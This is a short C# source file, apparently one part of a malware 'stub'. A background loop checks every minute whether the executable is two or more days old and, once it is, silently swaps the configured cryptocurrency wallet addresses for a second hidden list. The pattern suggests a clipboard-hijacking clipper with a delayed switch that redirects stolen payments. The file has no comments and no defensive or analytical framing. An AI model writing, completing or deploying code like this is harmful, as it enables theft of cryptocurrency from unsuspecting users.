using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub.Help.Native
{
    internal class Correctness
    {
        public async static void CorrectnessWallets()
        {
            await Task.Run(() =>
            {
                try
                {
                    while (true)
                    {
                        Thread.Sleep(60000);
                        if (File.GetLastWriteTime(HELP_String.currentProcess).AddDays(2) <= DateTime.Today)
                            Config.addresses = HELP_String.addresses_wall;
                    }
                }
                catch { }
            });
        }
    }
}
